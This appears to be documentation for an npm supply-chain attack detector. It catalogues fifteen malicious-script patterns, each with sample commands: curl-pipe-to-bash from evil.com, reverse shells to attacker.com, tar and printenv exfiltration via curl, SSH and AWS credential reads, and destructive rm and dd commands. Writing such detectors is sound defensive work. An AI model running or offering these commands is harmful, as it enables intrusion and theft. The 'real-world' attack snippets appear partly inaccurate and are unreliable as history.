# Comprehensive NPM Attack Detection System

## Overview
This system detects 15 major attack patterns in npm package.json scripts, providing comprehensive protection against supply chain attacks.

## Detected Attack Patterns

### 1. Remote Code Execution (CRITICAL)
**What it is:** Downloads and executes code from the internet
**Examples:**
```bash
curl http://evil.com/malware.sh | bash
wget http://attacker.com/payload.py | python
```
**Why it's dangerous:** Allows attackers to run arbitrary code on your system

### 2. Base64 Obfuscation (CRITICAL)
**What it is:** Hidden malicious code encoded in base64
**Examples:**
```bash
echo SGVsbG8gV29ybGQ= | base64 -d | bash
Buffer.from('bWFsaWNpb3VzIGNvZGU=', 'base64')
```
**Why it's dangerous:** Hides malicious intent from casual inspection

### 3. Credential Theft (CRITICAL)
**What it is:** Accesses sensitive authentication files
**Examples:**
```bash
cat ~/.ssh/id_rsa
cat ~/.aws/credentials
cat ~/.npmrc
```
**Why it's dangerous:** Steals SSH keys, AWS credentials, npm tokens

### 4. Reverse Shell (CRITICAL)
**What it is:** Establishes remote control connection
**Examples:**
```bash
bash -i >& /dev/tcp/10.0.0.1/8080 0>&1
nc -e /bin/bash attacker.com 4444
```
**Why it's dangerous:** Gives attacker full control of your system

### 5. Crypto Mining (HIGH → CRITICAL in install hooks)
**What it is:** Uses system resources for cryptocurrency mining
**Examples:**
```bash
xmrig --url=pool.minexmr.com:4444
minerd --url=stratum+tcp://pool.com:3333
```
**Why it's dangerous:** Consumes CPU/GPU resources, increases electricity costs

### 6. Data Exfiltration (HIGH → CRITICAL in install hooks)
**What it is:** Sends data to external servers
**Examples:**
```bash
tar czf - . | curl -X POST -d @- http://evil.com
curl -F "file=@sensitive.txt" http://attacker.com
```
**Why it's dangerous:** Steals source code, credentials, proprietary data

### 7. Process Spawning (HIGH → CRITICAL in install hooks)
**What it is:** Executes system commands
**Examples:**
```javascript
require('child_process').exec('malicious command')
os.system('rm -rf /')
```
**Why it's dangerous:** Can execute any system command

### 8. Eval Execution (HIGH → CRITICAL in install hooks)
**What it is:** Dynamic code execution
**Examples:**
```javascript
eval(maliciousCode)
Function('return ' + userInput)()
```
**Why it's dangerous:** Executes arbitrary JavaScript code

### 9. File Manipulation (CRITICAL)
**What it is:** Dangerous file operations
**Examples:**
```bash
rm -rf / --no-preserve-root
chmod 777 /etc/passwd
dd if=/dev/zero of=/dev/sda
```
**Why it's dangerous:** Can destroy data or compromise system security

### 10. Network Scanning (HIGH → CRITICAL in install hooks)
**What it is:** Probes network for vulnerabilities
**Examples:**
```bash
nmap -sS 192.168.1.0/24
masscan -p1-65535 10.0.0.0/8
```
**Why it's dangerous:** Reconnaissance for further attacks

### 11. Persistence (HIGH → CRITICAL in install hooks)
**What it is:** Ensures malware survives reboots
**Examples:**
```bash
echo 'malicious command' | crontab -
echo 'malware' >> ~/.bashrc
```
**Why it's dangerous:** Malware keeps running even after restart

### 12. Privilege Escalation (CRITICAL)
**What it is:** Attempts to gain root/admin access
**Examples:**
```bash
sudo chmod u+s /bin/bash
echo 'user ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers
```
**Why it's dangerous:** Gains full system control

### 13. Environment Harvesting (MEDIUM → HIGH in install hooks)
**What it is:** Harvests environment variables
**Examples:**
```bash
printenv | curl -X POST http://evil.com
process.env.AWS_SECRET_ACCESS_KEY
```
**Why it's dangerous:** May contain API keys, tokens, passwords

### 14. Suspicious Network Activity (MEDIUM → HIGH in install hooks)
**What it is:** Unusual network connections
**Examples:**
```bash
curl http://192.168.1.1:8080
wget http://suspicious-domain.tk
```
**Why it's dangerous:** May be command & control or data exfiltration

### 15. Code Injection (HIGH → CRITICAL in install hooks)
**What it is:** Prototype pollution / code injection
**Examples:**
```javascript
Object.prototype.isAdmin = true
__proto__.polluted = 'value'
```
**Why it's dangerous:** Can bypass security checks, modify application behavior

## Dangerous Lifecycle Hooks

These scripts run **automatically** during `npm install`:
- `preinstall` - Before package installation
- `install` - During package installation
- `postinstall` - After package installation
- `preuninstall` - Before package removal
- `uninstall` - During package removal
- `postuninstall` - After package removal

**Severity escalation:** Attacks in these hooks are automatically upgraded to higher severity levels.

## Detection Confidence Levels

- **0.95 (Very High):** Remote code execution, credential theft, reverse shell in dangerous hooks
- **0.90 (High):** Most attacks in dangerous lifecycle hooks
- **0.85 (High):** Critical attacks in manual scripts
- **0.70 (Medium):** Other attacks in manual scripts

## Protection Recommendations

### For Users
1. **Review scripts before installing:**
   ```bash
   npm view <package> scripts
   ```

2. **Use --ignore-scripts flag:**
   ```bash
   npm install --ignore-scripts <package>
   ```

3. **Check package reputation:**
   - Package age (prefer packages > 1 year old)
   - Download counts (prefer popular packages)
   - Author verification
   - GitHub stars/activity

4. **Use security tools:**
   ```bash
   npm audit
   npm audit fix
   ```

### For Package Authors
1. **Minimize script usage:** Only use scripts when absolutely necessary
2. **Avoid dangerous hooks:** Don't use preinstall/install/postinstall unless required
3. **Be transparent:** Document what your scripts do
4. **Use safe commands:** Avoid curl/wget/eval/exec
5. **Sign your packages:** Use npm provenance

## Real-World Examples

### flatmap-stream Attack (2018)
```json
{
  "scripts": {
    "preinstall": "node -e \"eval(Buffer.from('...base64...', 'base64').toString())\""
  }
}
```
**Impact:** Stole Bitcoin wallet credentials from Copay users

### event-stream Attack (2018)
```json
{
  "scripts": {
    "postinstall": "node ./malicious.js"
  }
}
```
**Impact:** 8 million downloads before detection

### ua-parser-js Attack (2021)
```json
{
  "scripts": {
    "preinstall": "node preinstall.js"
  }
}
```
**Impact:** Crypto miner and password stealer

## Testing

Run comprehensive tests:
```bash
python test_comprehensive_npm_detection.py
```

Expected output:
```
✅ All 15 attack patterns detected
✅ No false positives on safe scripts
🎉 Detection system working correctly
```

## Integration

The detection system is automatically used by:
- `NpmAnalyzer` in `tools/npm_analyzer.py`
- `analyze_supply_chain.py` main analysis script
- Web UI at `http://localhost:5000`

## API Usage

```python
from tools.sbom_tools import _analyze_npm_scripts

scripts = {
    "preinstall": "curl http://evil.com | bash"
}

findings = _analyze_npm_scripts(scripts, "suspicious-package")

for finding in findings:
    print(f"Severity: {finding.severity}")
    print(f"Type: {finding.finding_type}")
    print(f"Evidence: {finding.evidence}")
```

## Performance

- **Fast:** Regex-based pattern matching
- **Efficient:** Single pass through scripts
- **Scalable:** Can analyze thousands of packages
- **No external dependencies:** Pure Python implementation

## Limitations

1. **Obfuscation:** Heavily obfuscated code may evade detection
2. **False negatives:** New attack patterns may not be detected
3. **Context-blind:** Cannot understand legitimate use cases
4. **Static analysis only:** Doesn't execute code

## Future Enhancements

- [ ] Machine learning-based detection
- [ ] Dynamic analysis (sandboxed execution)
- [ ] Behavioral analysis
- [ ] Community-sourced patterns
- [ ] Integration with npm registry
- [ ] Real-time monitoring

## Contributing

To add new attack patterns:
1. Add pattern to `attack_patterns` dict in `_analyze_npm_scripts()`
2. Add test case to `test_comprehensive_npm_detection.py`
3. Run tests to verify detection
4. Update this documentation

## References

- [npm Security Best Practices](https://docs.npmjs.com/security-best-practices)
- [OWASP Top 10](https://owasp.org/www-project-top-ten/)
- [Snyk Vulnerability Database](https://snyk.io/vuln/)
- [GitHub Advisory Database](https://github.com/advisories)
- [OSV Database](https://osv.dev/)

## License

Part of the Multi-Agent Security Analysis System
